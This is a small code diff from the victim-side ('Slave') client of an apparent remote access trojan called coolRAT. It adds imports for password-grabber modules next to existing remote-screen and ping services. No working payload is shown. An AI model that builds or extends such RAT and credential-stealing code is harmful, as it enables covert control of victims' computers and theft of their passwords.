@@ -1,6 +1,8 @@
 ﻿using coolRAT.Libs;
 using coolRAT.Libs.Connections;
 using coolRAT.Libs.Packets;
+using coolRAT.Libs.Password_Grabbers;
+using coolRAT.Slave.Password_Grabbers;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -31,6 +33,7 @@ namespace coolRAT.Slave
             Task.Run(() => Globals.LocalClient.ClientPingService.Start(PingServiceType.Active));
 
             Globals.ScreenInstance = new RemoteScreen(Globals.LocalClient);
+
             Application.Run();
             return;
         }
